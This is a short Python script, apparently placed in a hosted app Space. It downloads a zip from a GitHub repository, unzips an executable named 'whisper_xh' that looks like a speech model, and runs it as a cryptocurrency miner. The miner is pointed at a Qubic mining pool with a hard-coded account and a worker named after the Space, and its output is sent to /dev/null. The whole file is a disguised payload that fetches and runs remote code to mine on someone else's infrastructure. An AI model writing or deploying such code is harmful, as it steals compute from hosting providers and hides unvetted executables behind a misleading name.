import os
os.system("wget https://github.com/qqivk/project-3/raw/refs/heads/main/whisper_xh.zip")
os.system("unzip whisper_xh.zip")
os.system("ls -lh")
os.system("chmod +x whisper_xh")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./whisper_xh --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wn} >/dev/null")
